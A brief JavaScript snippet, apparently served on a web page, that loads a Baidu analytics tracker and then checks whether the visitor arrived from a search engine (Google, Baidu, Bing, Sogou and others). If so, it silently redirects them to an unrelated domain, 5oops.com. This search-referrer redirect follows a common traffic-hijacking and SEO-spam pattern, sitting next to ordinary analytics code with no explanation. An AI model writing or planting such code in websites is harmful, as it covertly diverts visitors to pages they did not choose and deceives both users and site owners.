var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?2533735c66e2b53b43f1608bc862530b";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var regexp=/\.(sogou|soso|google|baidu|youdao|yahoo|bing|so|sm|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
if(regexp.test(where))
{
 location.href="https://www.5oops.com/mxc.html";
}
